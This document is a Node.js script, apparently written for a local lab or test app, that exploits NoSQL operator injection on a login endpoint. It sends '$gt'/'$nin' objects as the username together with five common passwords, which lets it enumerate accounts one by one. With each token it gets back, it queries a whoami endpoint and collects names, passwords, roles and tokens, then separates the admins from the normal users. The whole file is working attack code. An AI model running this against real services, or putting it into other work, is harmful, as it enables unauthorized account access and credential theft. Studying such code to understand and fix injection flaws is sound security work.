const fetch = require('node-fetch')

const passwordsToTest = ['test', '123', 'password', '123456', 'admin']

async function start() {
    const users = await fetchUsers()
    console.log('\n-------------------------\n')
    const admins = users.filter(user => user.role == 'admin')
    const normalUsers = users.filter(user => user.role == 'user')

    console.log('\n👋 Normal Users')
    console.log(normalUsers)
    console.log('\n💎 Admins')
    console.log(admins)
    console.log(`Found ${admins.length} admins and ${normalUsers.length} normal users.`)
}

async function fetchUsers() {
    let res = []
    for (const i in passwordsToTest) {
        const password = passwordsToTest[i]
        let foundUsers = []
        console.log('Check with password', password)
        while(true) {
            const foundNames = foundUsers.map(user =>  user.name )
            const header = {
                method: 'POST',
                headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    name: { "$gt":"", "$nin": foundNames }, 
                    password: password })
            }
        
            const result = await fetch('http://localhost:5000/api/users/login', header)
            if (result.status == 200) {
                const json = await result.json()
                const userDetails = await getUserDetails(json.token)
                foundUsers.push(userDetails)
                res.push(userDetails)
            } else {
                break
            }
        }
    }
    return res
}

async function getUserDetails(token) {
    const header = {
        method: 'GET',
        headers: {
            cookie: `token=${token}`
        },
    }
    const res = await fetch('http://localhost:5000/api/users/whoami', header)
    const json = await res.json()
    return {
        name: json.name, 
        password: json.password, 
        role: json.role,
        token: token
    }
}

start()
